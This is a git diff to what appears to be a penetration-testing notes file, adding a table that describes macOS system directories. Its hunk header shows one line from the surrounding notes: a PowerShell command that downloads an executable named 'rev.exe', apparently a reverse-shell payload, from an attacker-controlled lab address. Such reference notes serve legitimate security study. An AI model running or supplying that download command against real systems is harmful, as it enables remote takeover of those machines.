@@ -200,3 +200,18 @@ powershell -command "Invoke-WebRequest -Uri 'http://10.10.167.187:8888/rev.exe' 
 | C:\Windows\SysWOW64    | Contains 32-bit system files on 64-bit systems.                                     |
 | C:\Windows\Temp        | Contains temporary files that can be used by applications and the system.           |
 
+## macOs
+
+| Directory               | Description                                                                                   |
+|-------------------------|-----------------------------------------------------------------------------------------------|
+| /                       | The root directory, the top-level directory in the filesystem.                                |
+| /Applications           | Contains application software installed for all users.                                        |
+| /Library                | Contains system-wide resources, such as fonts, application support files, and preferences.    |
+| /System                 | Contains essential macOS system files.                                                        |
+| /Users                  | Contains user home directories, including Documents, Downloads, and other personal folders.   |
+| /Users/username         | The home directory for the user "username".                                                   |
+| /Users/username/Library | Contains user-specific resources, such as preferences, caches, and application support files. |
+| /Volumes                | Contains mounted filesystems, such as external drives and network shares.                     |
+| /private/tmp            | Contains temporary files that can be used by applications and the system.                     |
+| /private/var            | Contains system log files and other variable data files.                                      |
+
